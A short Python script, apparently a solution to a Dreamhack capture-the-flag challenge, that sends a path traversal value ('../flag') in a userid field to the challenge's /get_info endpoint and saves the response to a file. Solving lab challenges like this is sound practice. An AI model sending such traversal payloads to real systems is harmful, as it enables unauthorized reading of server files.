import requests

url = "http://host1.dreamhack.games:13589/get_info"
data = {
    "userid": "../flag"
}

response = requests.post(url, data=data)

with open("result.html", "w", encoding="utf-8") as f:
    f.write(response.text)

print("[+] 결과가 result.html 에 저장되었습니다.")
